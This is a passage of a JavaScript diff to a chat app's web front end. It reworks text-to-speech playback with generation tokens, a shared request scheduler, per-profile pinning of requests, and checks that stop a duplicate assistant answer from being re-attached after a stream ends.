+      if(!reserved) return {ok:false, err:new Error('aborted')};
+      return fetch(new URL('api/tts', document.baseURI || location.href).href, init)
+      .then(function(r){
+        if(r.status===429&&attempt<3){
+          attempt++;
+          return _dispatch();
+        }
+        if(!r.ok){
+          return r.json().catch(function(){return {};}).then(function(j){
+            throw new Error((j&&j.error)||('TTS request failed: '+r.status));
+          });
+        }
+        return r.arrayBuffer().then(function(buf){
+          // Keep the audio MIME type the server declared. Callers build a
+          // Blob for an <audio> element, and a Blob with no type loses the
+          // `audio/mpeg` the response carried (master's r.blob() preserved
+          // it) — Safari is the browser that needs it to decode.
+          const ct=(r.headers&&typeof r.headers.get==='function')
+            ? r.headers.get('content-type') : '';
+          return {ok:true, buf:buf, type:(ct||'').split(';')[0].trim()};
+        });
+      })
+      .then(
+        function(res){
+          // A 429-retry settles to an already-settled {ok}/{err} result;
+          // pass it through instead of double-wrapping it as the chunk buf.
+          if(res&&typeof res==='object'&&('ok' in res)) return res;
+          return {ok:true, buf:res};
+        },
+        function(err){ return {ok:false, err:err}; }
+      );
+    });
+  }
+  return _dispatch();
+}
 let _ttsCurrentUtterance=null;
 let _ttsChunkQueue=[];
 let _ttsChunkIndex=0;
 let _ttsActiveBtn=null;
 let _playingEdgeAudio=null;
 
-function _buildBrowserUtterance(text, btn){
+function _buildBrowserUtterance(text, btn, gen){
   const utter=new SpeechSynthesisUtterance(text);
   const savedVoice=localStorage.getItem('hermes-tts-voice');
   const voices=speechSynthesis.getVoices();
@@ -8972,6 +10070,9 @@ function _buildBrowserUtterance(text, btn){
   const savedPitch=parseFloat(localStorage.getItem('hermes-tts-pitch'));
   if(!isNaN(savedPitch)) utter.pitch=Math.min(2,Math.max(0,savedPitch));
   utter.onend=()=>{
+    // A cancelled/replaced utterance's late onend must not advance the
+    // chunk chain — that would resume a stopped playback under a new one.
+    if(!_ownsTtsPlayback(gen)) return;
     _ttsChunkIndex++;
     if(_ttsChunkIndex<_ttsChunkQueue.length){
       const next=new SpeechSynthesisUtterance(_ttsChunkQueue[_ttsChunkIndex]);
@@ -8986,6 +10087,7 @@ function _buildBrowserUtterance(text, btn){
     }
   };
   utter.onerror=()=>{
+    if(!_ownsTtsPlayback(gen)) return;
     _ttsSpeaking=false; _ttsCurrentUtterance=null;
     _ttsChunkQueue=[]; _ttsChunkIndex=0; _ttsActiveBtn=null;
     if(btn) btn.dataset.speaking='0';
@@ -8993,13 +10095,47 @@ function _buildBrowserUtterance(text, btn){
   return utter;
 }
 
+// Stop whatever audio currently owns the shared handle (a Web Audio source,
+// or an Audio element from the Edge/extension paths) and clear it. Every
+// replacement and failure path routes through here so a released playback
+// never keeps sounding over the new one.
+function _stopActivePlaybackAudio(){
+  if(!_playingEdgeAudio) return;
+  try{
+    if(typeof _playingEdgeAudio.stop==='function'){
+      _playingEdgeAudio.stop(); _playingEdgeAudio.disconnect();
+    }else{
+      _playingEdgeAudio.pause(); _playingEdgeAudio.currentTime=0;
+    }
+  }catch(_){}
+  _playingEdgeAudio=null;
+}
+
 function _playEdgeTtsChunked(text, btn){
-  _ttsSpeaking=true;
   if(btn) btn.dataset.speaking='1';
+  // Claim the generation before releasing the previous playback's audio, so
+  // the old generation is already invalid when its stop-fallout callbacks run.
+  const gen=_beginTtsPlayback();
+  _stopActivePlaybackAudio();
   const chunks=_splitForTTS(text);
+  const _owns=function(){ return _ownsTtsPlayback(gen); };
+  // #7529 (release gate): pin the whole reply to the profile it started on, as
+  // the OpenAI path does. Reading S.activeProfile per chunk let a mid-reply
+  // profile switch send the remaining chunks under the new profile.
+  const playbackProfile=(S&&S.activeProfile)||'default';
+  const _fail=function(msg){
+    if(!_owns()) return;
+    _ttsSpeaking=false;
+    _stopActivePlaybackAudio();
+    if(btn) btn.dataset.speaking='0';
+    if(msg&&typeof showToast==='function') showToast(msg,4000,'error');
+  };
   const _playOne=function(idx){
+    // Ownership gate: a late continuation from a replaced/stopped playback
+    // must not start audio or mutate shared state.
+    if(!_owns()){ return; }
     if(idx>=chunks.length){
-      _ttsSpeaking=false;_playingEdgeAudio=null;
+      _ttsSpeaking=false;
       if(btn) btn.dataset.speaking='0';
       return;
     }
@@ -9010,47 +10146,43 @@ function _playEdgeTtsChunked(text, btn){
     let rate='', pitch='';
     if(!isNaN(savedRate)){const pct=Math.round((savedRate-1)*100);const sign=pct>=0?'+':'';rate=sign+pct+'%';}
     if(!isNaN(savedPitch)){const hz=Math.round((savedPitch-1)*50);const sign=hz>=0?'+':'';pitch=sign+hz+'Hz';}
-    fetch(new URL('api/tts', document.baseURI || location.href).href, {
+    // Every Edge chunk goes through the shared /api/tts scheduler: the server
+    // limiter is per-client across engines, so a request that follows another
+    // engine's fetch (or a replacement inside the window) must wait, not 429.
+    // #7529: the profile captured at playback start travels with every chunk —
+    // the scheduler can hold one for up to 2s and re-send it after a 429.
+    const _chunkProfile=playbackProfile;
+    _sendTtsRequest({
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({text:chunk, voice:voice, rate:rate, pitch:pitch})
-    })
-    .then(function(r){
-      if(!r.ok){
-        return r.json().catch(function(){return {};}).then(function(j){
-          throw new Error((j&&j.error)||('TTS request failed: '+r.status));
-        });
-      }
-      return r.blob();
-    })
-    .then(function(blob){
-      if(!_ttsSpeaking) return;
-      const url=URL.createObjectURL(blob);
+      body:JSON.stringify({text:chunk, voice:voice, rate:rate, pitch:pitch, engine:'edge', profile:_chunkProfile})
+    }, _owns)
+    .then(function(res){
+      if(!_owns()) return;
+      if(!res.ok){ _fail((res.err&&res.err.message)||'Edge TTS failed'); return; }
+      const url=URL.createObjectURL(new Blob([res.buf],{type:res.type}));
       const audio=new Audio(url);
       _playingEdgeAudio=audio;
       audio.onended=function(){
         URL.revokeObjectURL(url);
-        _playingEdgeAudio=null;
-        if(_ttsSpeaking) _playOne(idx+1);
+        if(_playingEdgeAudio===audio) _playingEdgeAudio=null;
+        if(_owns()) _playOne(idx+1);
       };
       audio.onerror=function(){
         URL.revokeObjectURL(url);
-        _playingEdgeAudio=null;
+        if(_playingEdgeAudio===audio) _playingEdgeAudio=null;
+        if(!_owns()) return;
         _ttsSpeaking=false;
         if(btn) btn.dataset.speaking='0';
       };
       audio.play().catch(function(e){
         URL.revokeObjectURL(url);
-        _playingEdgeAudio=null;
-        _ttsSpeaking=false;
-        if(btn) btn.dataset.speaking='0';
-        if(typeof showToast==='function') showToast('Edge TTS error: '+(e&&e.message||e));
+        if(_playingEdgeAudio===audio) _playingEdgeAudio=null;
+        _fail('Edge TTS error: '+(e&&e.message||e));
       });
     })
     .catch(function(e){
-      _ttsSpeaking=false;_playingEdgeAudio=null;
-      if(btn) btn.dataset.speaking='0';
-      if(typeof showToast==='function') showToast('Edge TTS failed: '+(e&&e.message||e));
+      _fail('Edge TTS failed: '+(e&&e.message||e));
     });
   };
   _playOne(0);
@@ -9084,12 +10216,16 @@ function speakMessage(btn){
     return;
   }
   // Extension-registered TTS engine (window.registerHermesTtsEngine). Synthesize
-  // via the extension, then play through the shared audio-buffer path.
+  // via the extension, then play through the shared audio-buffer path. The
+  // generation token gates the late synth completion: a promise resolved
+  // after a stop/replacement must not start audio or clear newer state.
   if(typeof window._hermesTtsIsRegistered==='function' && window._hermesTtsIsRegistered(engine)){
+    const gen=_beginTtsPlayback();
     if(btn) btn.dataset.speaking='1';
-    _ttsSpeaking=true;
     const _failReg=function(msg){
-      _ttsSpeaking=false;_playingEdgeAudio=null;
+      if(!_ownsTtsPlayback(gen)) return;
+      _ttsSpeaking=false;
+      _stopActivePlaybackAudio();
       if(btn)btn.dataset.speaking='0';
       if(msg&&typeof showToast==='function') showToast(msg,4000,'error');
     };
@@ -9099,7 +10235,10 @@ function speakMessage(btn){
       pitch: parseFloat(localStorage.getItem('hermes-tts-pitch')),
     };
     Promise.resolve(window._hermesTtsSynth(engine, clean, _opts))
-      .then(function(buf){ return _playAudioBuf(buf, btn, 'TTS'); })
+      .then(function(buf){
+        if(!_ownsTtsPlayback(gen)) return;
+        return _playAudioBuf(buf, btn, 'TTS', gen);
+      })
       .catch(function(e){ _failReg((e&&e.message)||'TTS engine failed'); });
     return;
   }
@@ -9112,66 +10251,181 @@ function speakMessage(btn){
   _ttsChunkQueue=_splitForTTS(clean);
   _ttsChunkIndex=0;
   _ttsActiveBtn=btn;
-  _ttsSpeaking=true;
+  const gen=_beginTtsPlayback();
   if(btn) btn.dataset.speaking='1';
 
-  const utter=_buildBrowserUtterance(_ttsChunkQueue[0], btn);
+  const utter=_buildBrowserUtterance(_ttsChunkQueue[0], btn, gen);
   _ttsCurrentUtterance=utter;
   speechSynthesis.speak(utter);
 }
 
 function _playElevenLabsTts(text, btn){
   if(btn) btn.dataset.speaking='1';
-  _ttsSpeaking=true;
+  // Claim before releasing the previous playback (same ownership contract as
+  // _playOpenaiTts), then route the request through the shared scheduler.
+  const gen=_beginTtsPlayback();
+  _stopActivePlaybackAudio();
+  const _owns=function(){ return _ownsTtsPlayback(gen); };
+  // #7529: capture the profile at request-build time (see _playOpenaiTts).
+  const _ttsProfile=(S&&S.activeProfile)||'default';
   const _fail=function(msg){
-    _ttsSpeaking=false;_playingEdgeAudio=null;
+    if(!_owns()) return;
+    _ttsSpeaking=false;
+    _stopActivePlaybackAudio();
     if(btn)btn.dataset.speaking='0';
     if(msg&&typeof showToast==='function') showToast(msg,4000,'error');
   };
-  fetch(new URL('api/tts', document.baseURI || location.href).href, {
+  _sendTtsRequest({
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({text:text, engine:'elevenlabs'})
-  })
-  .then(function(r){
-    if(!r.ok){
-      return r.json().catch(function(){return {};}).then(function(j){
-        throw new Error((j&&j.error)||('TTS request failed: '+r.status));
-      });
-    }
-    return r.arrayBuffer();
-  })
-  .then(function(buf){
-    return _playAudioBuf(buf, btn, 'ElevenLabs TTS');
+    body:JSON.stringify({text:text, engine:'elevenlabs', profile:_ttsProfile})
+  }, _owns)
+  .then(function(res){
+    if(!_owns()) return;
+    if(!res.ok){ _fail((res.err&&res.err.message)||'ElevenLabs TTS failed'); return; }
+    return _playAudioBuf(res.buf, btn, 'ElevenLabs TTS', gen);
   })
   .catch(function(e){ _fail((e&&e.message)||'ElevenLabs TTS failed'); });
 }
 
 function _playOpenaiTts(text, btn){
   if(btn) btn.dataset.speaking='1';
-  _ttsSpeaking=true;
+  // Generation token: every new playback invalidates all in-flight callbacks
+  // of prior plays (`_ttsSpeaking` alone cannot distinguish playback A from
+  // B). Claim it before releasing the previous playback's audio, so the old
+  // generation is already dead when its stop-fallout callbacks run — direct
+  // callers (auto-read) must not overlap either, since speakMessage() is not
+  // the only entry point.
+  const gen=_beginTtsPlayback();
+  _stopActivePlaybackAudio();
+  // Profile ownership of the whole playback. A chunk ownership gate on the
+  // generation alone survives a profile switch, so the remainder of profile A's
+  // reply would be sent under profile B's provider/credentials. Capture the
+  // profile at playback start and send it with every chunk request; the server
+  // rejects a mismatch with 409 before touching the limiter or config.
+  const playbackProfile=(S&&S.activeProfile)||'default';
   const _fail=function(msg){
-    _ttsSpeaking=false;_playingEdgeAudio=null;
+    // Terminal failure: invalidate every scheduled/pending callback of this
+    // playback (paced prefetch timers, in-flight fetch then-chains) so no
+    // follow-on request can fire after a terminal error, and stop/disconnect
+    // any partially constructed source before dropping the handle.
+    _ttsGeneration++;
+    _ttsSpeaking=false;
+    _stopActivePlaybackAudio();
     if(btn)btn.dataset.speaking='0';
     if(msg&&typeof showToast==='function') showToast(msg,4000,'error');
   };
-  fetch(new URL('api/tts', document.baseURI || location.href).href, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({text:text, engine:'openai'})
-  })
-  .then(function(r){
-    if(!r.ok){
-      return r.json().catch(function(){return {};}).then(function(j){
-        throw new Error((j&&j.error)||('TTS request failed: '+r.status));
-      });
+  const chunks=_splitForTTS(text,150);
+  if(!chunks.length){ _fail('No text to speak'); return; }
+
+  // Prefetch pipeline: fetch chunk N+1 while playing chunk N.
+  // Uses inline Web Audio playback (not _playAudioBuf) because
+  // _playAudioBuf clears _ttsSpeaking on end, which would break
+  // the chunk chain — we need _ttsSpeaking to stay true between chunks
+  // so src.onended can distinguish natural end (continue) from stopTTS (halt).
+  var _nextBufPromise=null;
+  function _fetchChunk(i){
+    // Route through the shared /api/tts scheduler: the request slot is
+    // paced/reserved across engines and generations (the server limiter is
+    // per-client), with a bounded owner-aware 429 retry. A request whose
+    // generation dies while waiting resolves aborted and never fires.
+    return _sendTtsRequest({
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        text:chunks[i],
+        engine:'openai',
+        // #7529: ALWAYS send the captured profile, including 'default'.
+        // S.activeProfile starts as 'default' and _handle_tts only rejects an
+        // explicit mismatch, so a request with no profile is accepted under
+        // whichever profile happens to be active. Starting playback in the
+        // default profile and switching to a named one therefore sent the rest
+        // of the reply under the NAMED profile's TTS config and key.
+        // _profiles_match treats 'default' and a renamed root as the same
+        // profile, so sending it explicitly is safe and closes the leak.
+        profile:playbackProfile||'default'
+      })
+    }, function(){ return _ownsTtsPlayback(gen); });
+  }
+  function _playChunk(i){
+    if(!_ttsSpeaking||!_ownsTtsPlayback(gen)){ return; }
+    if(i>=chunks.length){
+      _ttsSpeaking=false;_playingEdgeAudio=null;
+      if(btn)btn.dataset.speaking='0';
+      return;
     }
-    return r.arrayBuffer();
-  })
-  .then(function(buf){
-    return _playAudioBuf(buf, btn, 'OpenAI TTS');
-  })
-  .catch(function(e){ _fail((e&&e.message)||'OpenAI TTS failed'); });
+    var bufPromise=_nextBufPromise||_fetchChunk(i);
+    bufPromise
+    .then(function(res){
+      if(!_ttsSpeaking||!_ownsTtsPlayback(gen)) return;
+      if(!res.ok){ _fail((res.err&&res.err.message)||'OpenAI TTS failed'); return; }
+      var ctx=_getTtsAudioCtx();
+      if(!ctx){ _fail('Web Audio API not available'); return; }
+      var buf;
+      try{ buf=res.buf.slice(0); }catch(e){
+        _fail('OpenAI TTS error: '+(e&&e.message||e)); return;
+      }
+      // Prefetch is issued only after the chunk actually starts playing
+      // (inside the decode callback), so a decode/construct/start failure
+      // can never leave a paced prefetch timer behind.
+      ctx.decodeAudioData(buf, function(audioBuffer){
+        if(!_ttsSpeaking||!_ownsTtsPlayback(gen)) return;
+        // A suspended context (autoplay policy) must resume before we start.
+        // Observe the resume() promise: a rejection is a terminal failure
+        // instead of a chain that silently waits forever.
+        var doStart=function(){
+          // Synchronous Web Audio construction (createBufferSource, connect,
+          // start) can throw; route every failure through the generation-aware
+          // terminal handler so speaking state is never left dangling.
+          try{
+            if(!_ttsSpeaking||!_ownsTtsPlayback(gen)) return;
+            var src=ctx.createBufferSource();
+            src.buffer=audioBuffer;
+            src.connect(ctx.destination);
+            _playingEdgeAudio=src;
+            // stopTTS() bumps _ttsGeneration and sets _ttsSpeaking=false, then
+            // calls src.stop(), which fires onended. Natural end keeps both
+            // unchanged, so onended can distinguish continue from halt. The
+            // ownership guard keeps a stale onended from a replaced source
+            // from erasing the new playback's active handle.
+            src.onended=function(){
+              if(_playingEdgeAudio===src){ _playingEdgeAudio=null; }
+              try{ src.disconnect(); }catch(_){}
+              if(_ttsSpeaking&&_ownsTtsPlayback(gen)) _playChunk(i+1);
+            };
+            src.start(0);
+            // Prefetch next chunk while this one is playing (paced via
+            // _fetchChunk). Done only after start succeeds, so a terminal
+            // failure above leaves no scheduled follow-on request.
+            if(i+1<chunks.length){ _nextBufPromise=_fetchChunk(i+1); }
+          }catch(e){
+            if(_ttsSpeaking&&_ownsTtsPlayback(gen)){
+              _fail('OpenAI TTS error: '+(e&&e.message||e));
+            }
+          }
+        };
+        if(ctx.state==='running'){ doStart(); return; }
+        var rp=ctx.resume();
+        if(!rp||typeof rp.then!=='function'){ doStart(); return; }
+        rp.then(doStart).catch(function(e){
+          if(!_ttsSpeaking||!_ownsTtsPlayback(gen)) return;
+          _fail('OpenAI TTS error: '+(e&&e.message||e));
+        });
+      }, function(e){
+        if(!_ttsSpeaking||!_ownsTtsPlayback(gen)) return;
+        _fail('OpenAI TTS error: '+(e&&e.message||e));
+      });
+    })
+    .catch(function(e){
+      // Terminal guard: any unexpected failure in this chunk's chain must
+      // clear speaking state, but only when this generation is still current.
+      if(_ttsSpeaking&&_ownsTtsPlayback(gen)){
+        _fail('OpenAI TTS error: '+(e&&e.message||e));
+      }
+    });
+  }
+  try{ _playChunk(0); }
+  catch(e){ _fail('OpenAI TTS error: '+(e&&e.message||e)); }
 }
 
 // ── Shared AudioContext for TTS playback (no blob URLs needed) ──
@@ -9182,55 +10436,113 @@ function _getTtsAudioCtx(){
     if(!C) return null;
     _ttsAudioCtx=new C();
   }
-  if(_ttsAudioCtx.state==='suspended') _ttsAudioCtx.resume();
+  if(_ttsAudioCtx.state==='suspended'){
+    var rp=_ttsAudioCtx.resume();
+    // Observe the resume promise so shared paths never surface an
+    // unhandled rejection; the OpenAI chunk chain additionally routes a
+    // rejected resume to its generation-aware terminal handler.
+    if(rp&&typeof rp.then==='function') rp.catch(function(){});
+  }
   return _ttsAudioCtx;
 }
 
-function _playAudioBuf(arrayBuffer, btn, label){
+// Shared audio-buffer playback used by the ElevenLabs/extension engines.
+// `gen` is the caller's playback token: only the owning generation may start
+// audio or clear shared state — a replaced playback's late decode/onended
+// must never clobber a newer source, handle, or speaking state.
+function _playAudioBuf(arrayBuffer, btn, label, gen){
+  const _owns=function(){ return _ownsTtsPlayback(gen); };
   const ctx=_getTtsAudioCtx();
   if(!ctx){
-    if(btn)btn.dataset.speaking='0';
-    _ttsSpeaking=false;
-    showToast(label+': Web Audio API not available');
+    if(_owns()){
+      if(btn)btn.dataset.speaking='0';
+      _ttsSpeaking=false;
+      showToast(label+': Web Audio API not available');
+    }
     return;
   }
   return new Promise(function(resolve){
-    ctx.decodeAudioData(arrayBuffer.slice(0), function(audioBuffer){
-      const src=ctx.createBufferSource();
-      src.buffer=audioBuffer;
-      src.connect(ctx.destination);
-      _playingEdgeAudio=src;
-      const _cleanup=function(){
-        _ttsSpeaking=false;_playingEdgeAudio=null;
+    // Terminal settlement shared by every failure path (sync construction
+    // error, resume rejection, decode failure): stop/disconnect any
+    // partially constructed source, clear shared state only while this
+    // generation still owns playback, and always settle the returned
+    // promise so a dead playback can never leave callers hanging.
+    const _settleFailure=function(msg, partialSrc){
+      if(partialSrc){
+        try{ partialSrc.onended=null; partialSrc.stop(); partialSrc.disconnect(); }catch(_){}
+        if(_playingEdgeAudio===partialSrc) _playingEdgeAudio=null;
+      }
+      if(_owns()){
+        _ttsSpeaking=false;
         if(btn)btn.dataset.speaking='0';
-        try{src.stop();src.disconnect();}catch(_){}
-        resolve();
+        if(msg&&typeof showToast==='function') showToast(msg,4000,'error');
+      }
+      resolve();
+    };
+    const _onDecoded=function(audioBuffer){
+      if(!_owns()){ resolve(); return; }
+      // Synchronous Web Audio construction (createBufferSource, connect,
+      // start) can throw; route every failure through the generation-aware
+      // settlement so no partial source survives and the promise is never
+      // left pending.
+      const _start=function(){
+        if(!_owns()){ resolve(); return; }
+        var src=null;
+        try{
+          src=ctx.createBufferSource();
+          src.buffer=audioBuffer;
+          src.connect(ctx.destination);
+          _playingEdgeAudio=src;
+          const _cleanup=function(){
+            try{src.stop();src.disconnect();}catch(_){}
+            if(_owns()){
+              _ttsSpeaking=false;
+              if(_playingEdgeAudio===src) _playingEdgeAudio=null;
+              if(btn)btn.dataset.speaking='0';
+            }
+            resolve();
+          };
+          src.onended=_cleanup;
+          src.start(0);
+        }catch(e){
+          _settleFailure(label+' error: '+(e&&e.message||e), src);
+        }
       };
-      src.onended=_cleanup;
-      src.start(0);
-    }, function(e){
-      _ttsSpeaking=false;
-      if(btn)btn.dataset.speaking='0';
-      showToast(label+' error: '+(e&&e.message||e));
-      resolve(); // prevent permanently pending Promise on decode failure
-    });
+      // A suspended context (autoplay policy) must resume before start.
+      // Observe the resume promise: rejection is a terminal failure instead
+      // of playback that waits forever with the Listen button stuck (same
+      // owner-aware settlement as the OpenAI chunk path).
+      if(ctx.state==='running'){ _start(); return; }
+      var rp=null;
+      try{ rp=ctx.resume(); }catch(e){ _settleFailure(label+' error: '+(e&&e.message||e), null); return; }
+      if(!rp||typeof rp.then!=='function'){ _start(); return; }
+      rp.then(function(){ _start(); }).catch(function(e){ _settleFailure(label+' error: '+(e&&e.message||e), null); });
+    };
+    try{
+      ctx.decodeAudioData(arrayBuffer.slice(0), _onDecoded, function(e){
+        if(_owns()){
+          _ttsSpeaking=false;
+          if(btn)btn.dataset.speaking='0';
+          showToast(label+' error: '+(e&&e.message||e));
+        }
+        resolve(); // prevent permanently pending Promise on decode failure
+      });
+    }catch(e){
+      _settleFailure(label+' error: '+(e&&e.message||e), null);
+    }
   });
 }
 function stopTTS(){
+  // Invalidate every in-flight generation (all engines, all chains) before
+  // clearing state, so a late fetch/onended/decode callback can neither
+  // resume a stopped chain nor clobber a later playback.
+  _ttsGeneration++;
   if('speechSynthesis' in window){
     speechSynthesis.cancel();
   }
-  // Stop Web Audio API playback (AudioBufferSourceNode)
-  if(_playingEdgeAudio){
-    try{
-      if(typeof _playingEdgeAudio.stop==='function'){
-        _playingEdgeAudio.stop(); _playingEdgeAudio.disconnect();
-      }else{
-        _playingEdgeAudio.pause(); _playingEdgeAudio.currentTime=0;
-      }
-    }catch(_){}
-    _playingEdgeAudio=null;
-  }
+  // Stop whatever engine currently owns the audio handle (Web Audio source
+  // or Audio element).
+  _stopActivePlaybackAudio();
   _ttsSpeaking=false;
   _ttsCurrentUtterance=null;
   _ttsChunkQueue=[];
@@ -9238,6 +10550,13 @@ function stopTTS(){
   _ttsActiveBtn=null;
   // Reset all speaking buttons
   document.querySelectorAll('[data-speaking="1"]').forEach(btn=>{ btn.dataset.speaking='0'; });
+  // Voice-mode closure: the generation above just invalidated every playback,
+  // so any rearm a terminal callback scheduled earlier is now stale (it will
+  // defer, not reopen the mic). Notify voice mode — while it is still
+  // speaking, boot.js schedules the owner-aware rearm that hands the mic back
+  // once the audio it now owns has gone quiet. This covers a cancel that
+  // lands before the cancelled playback's own terminal callback.
+  if(typeof window._hermesTtsVoiceClosure==='function') window._hermesTtsVoiceClosure();
 }
 
 function autoReadLastAssistant(){
@@ -9253,6 +10572,13 @@ function autoReadLastAssistant(){
   if(!text.trim()) return;
   const clean=_stripForTTS(text);
   if(!clean) return;
+  // Canonical replacement boundary: auto-read replaces any active playback,
+  // whichever engine produced it. stopTTS() invalidates in-flight chains,
+  // cancels browser speech, stops Web Audio, and resets every
+  // [data-speaking="1"] button — the same boundary speakMessage() uses.
+  // Without it, a new auto-read could overlap the previous engine's audio
+  // and leave a manual button visibly stuck in the speaking state.
+  stopTTS();
   if(engine==='openai'){
     _playOpenaiTts(clean, null);
     return;
@@ -9269,15 +10595,18 @@ function autoReadLastAssistant(){
   // the extension, then play through the shared audio-buffer path. Mirrors the
   // registered-engine branch in speakMessage() so auto-read honors the selection.
   if(typeof window._hermesTtsIsRegistered==='function' && window._hermesTtsIsRegistered(engine)){
-    _ttsSpeaking=true;
+    const gen=_beginTtsPlayback();
     const _opts={
       voice: localStorage.getItem('hermes-tts-voice')||'',
       rate: parseFloat(localStorage.getItem('hermes-tts-rate')),
       pitch: parseFloat(localStorage.getItem('hermes-tts-pitch')),
     };
     Promise.resolve(window._hermesTtsSynth(engine, clean, _opts))
-      .then(function(buf){ return _playAudioBuf(buf, null, 'TTS'); })
-      .catch(function(){ _ttsSpeaking=false; _playingEdgeAudio=null; });
+      .then(function(buf){
+        if(!_ownsTtsPlayback(gen)) return;
+        return _playAudioBuf(buf, null, 'TTS', gen);
+      })
+      .catch(function(){ if(_ownsTtsPlayback(gen)){ _ttsSpeaking=false; _playingEdgeAudio=null; } });
     return;
   }
   // Unknown/unregistered engine (e.g. an extension engine that's no longer
@@ -9286,8 +10615,8 @@ function autoReadLastAssistant(){
   // Use chunked playback for browser TTS
   _ttsChunkQueue=_splitForTTS(clean);
   _ttsChunkIndex=0;
-  _ttsSpeaking=true;
-  const utter=_buildBrowserUtterance(_ttsChunkQueue[0], null);
+  const gen=_beginTtsPlayback();
+  const utter=_buildBrowserUtterance(_ttsChunkQueue[0], null, gen);
   _ttsCurrentUtterance=utter;
   speechSynthesis.speak(utter);
 }
@@ -9697,6 +11026,99 @@ function _liveAssistantSegmentTextLength(seg){
   return String(body.textContent||'').trim().length;
 }
 
+// ── #6948 follow-up: settled-transcript ownership of a live-turn node ──────
+// (duplicate assistant answer; upstream symptom report #2051)
+//
+// Both live-turn insertion paths — the renderMessages() re-attach and
+// restoreLiveTurnHtmlForSession() — have one branch that ADDS a turn the
+// settled rebuild did not produce. The assistant row is persisted a few ms
+// BEFORE the stream's terminal event clears S.activeStreamId, so a dead live
+// node left behind by an INFLIGHT entry that outlived its stream is re-attached
+// on top of the settled transcript: the same answer twice, self-sustaining
+// across later renders (the node keeps id=liveAssistantTurn and is re-preserved
+// by the #6948 guard), healed only by a reload.
+//
+// Dropping a live node must be an OWNERSHIP proof, never "the rendered text
+// looks the same":
+//   * the live body is built by the streaming smd parser and the settled body
+//     by renderMd + post-processing, so their textContent differs for anything
+//     past single-paragraph plain text (lists, fenced code with its language
+//     label, tables, `_underscore_` emphasis, the injected copy button) — a
+//     text comparison would miss most real answers; and
+//   * an identical answer earlier in the history (a repeated "Done.", a
+//     greeting, a same-prompt resend) would delete a GENUINELY LIVE turn: while
+//     the current turn is unpersisted, the last settled assistant message IS the
+//     previous turn's answer.
+// So ownership is proved from state: the transcript must END with a settled
+// assistant message that THIS stream produced, and the node must carry nothing
+// the settled rebuild could not have produced.
+
+// Stream identity persisted on a settled assistant message. The server stamps
+// _anchor_stream_id from the anchor-scene sidecar record (api/routes.py); the
+// client stamps _anchor_stream_id and scene.identity.stream_id at stream end
+// (_attachProjectedAnchorSceneToLastAssistant, static/messages.js).
+function _settledAssistantStreamId(message){
+  if(!message) return '';
+  const scene=message._anchor_activity_scene||null;
+  const identity=(scene&&scene.identity)||null;
+  return String(message._anchor_stream_id||(scene&&scene.stream_id)||(identity&&identity.stream_id)||'');
+}
+// The live-projection markers the #6948 preserve guard already treats as proof
+// of a live owner. A message the client still considers live is never evidence
+// that the turn has settled.
+function _messageHasLiveAssistantProjection(m){
+  return !!(m&&m.role==='assistant'&&(m._live||m._activityBurstId!==undefined||m._liveSegmentSeq!==undefined));
+}
+// True when the live turn holds something the settled rebuild cannot have
+// produced from S.messages — an unpersisted tool card, reasoning/thinking row,
+// transparent-stream row, or a second live segment. Such a node is never
+// dropped: #3714's whole premise is that the live DOM can be AHEAD of
+// S.messages, and a tail-segment match must not discard the tool card or the
+// earlier segment above it. An unknown node shape fails closed (keep the turn).
+function _liveTurnCarriesUnsettledContent(turn){
+  if(!turn||typeof turn.querySelectorAll!=='function') return true;
+  if(turn.querySelectorAll(
+    '.tool-card-row,.wl-reason,.agent-activity-thinking,.thinking-card-row,.transparent-event-row'
+  ).length) return true;
+  return turn.querySelectorAll('[data-live-assistant="1"]').length>1;
+}
+function _settledTranscriptOwnsLiveTurn(sid, turn){
+  if(!turn) return false;
+  const msgs=(typeof S!=='undefined'&&S&&Array.isArray(S.messages))?S.messages:null;
+  if(!msgs||!msgs.length) return false;
+  // The transcript must END with a settled assistant answer. A trailing user
+  // turn means the live turn IS the current turn — nothing of it is persisted
+  // yet, so it can never be a leftover (this is the case a text comparison gets
+  // wrong when the previous answer happens to read the same), and a live
+  // projection anywhere means the rebuild still owns a live turn of its own.
+  const last=msgs[msgs.length-1];
+  if(!last||last.role!=='assistant') return false;
+  if(msgs.some(_messageHasLiveAssistantProjection)) return false;
+  const inflight=(typeof INFLIGHT!=='undefined'&&INFLIGHT)?INFLIGHT[sid]:null;
+  // Owner of the live DOM: INFLIGHT carries the id of the stream that built it
+  // (attachLiveStream), and S.activeStreamId is that same id until the terminal
+  // event clears it.
+  const liveStreamId=String((inflight&&inflight.streamId)||(typeof S!=='undefined'&&S&&S.activeStreamId)||'');
+  const settledStreamId=_settledAssistantStreamId(last);
+  if(settledStreamId){
+    // Identity recorded on both sides decides — renderer- and text-independent,
+    // so code blocks, lists and tables are handled like plain prose.
+    if(!liveStreamId||settledStreamId!==liveStreamId) return false;
+  }else{
+    // No persisted identity on the tail (a turn whose scene was not worklog
+    // worthy). Compare SOURCE with SOURCE — the markdown this stream produced
+    // (INFLIGHT.lastAssistantText) against the persisted message content —
+    // never two independently rendered DOM trees. Regeneration cannot reach
+    // this branch: startRegeneration() truncates S.messages at the user turn,
+    // so the tail is a user message while a regenerated answer streams.
+    const streamed=String((inflight&&inflight.lastAssistantText)||'').replace(/\s+/g,' ').trim();
+    if(!streamed) return false;
+    const settled=String((typeof msgContent==='function'?msgContent(last):last.content)||'').replace(/\s+/g,' ').trim();
+    if(!settled||streamed!==settled) return false;
+  }
+  return !_liveTurnCarriesUnsettledContent(turn);
+}
+
 function _mergeRestoredLiveAssistantSegment(restored, existing){
   if(!restored||!existing) return;
   const existingLive=existing.querySelector('[data-live-assistant="1"]');
@@ -9733,6 +11155,18 @@ function restoreLiveTurnHtmlForSession(sid){
   const existing=$('liveAssistantTurn');
   _mergeRestoredLiveAssistantSegment(restored, existing);
   if(existing) existing.replaceWith(restored);
+  // #6948 follow-up (duplicate assistant answer; #2051): only this branch ADDS a
+  // turn — replacing an existing live turn cannot duplicate. When the settled
+  // transcript already owns the stream this snapshot belongs to, appending it
+  // pins a SECOND copy of the same answer under the settled one. Release the
+  // stale snapshot (no other consumer can use it — it would be re-refused on
+  // every later restore) and report "nothing restored", so loadSession takes the
+  // same path it already takes for an INFLIGHT entry that never carried one.
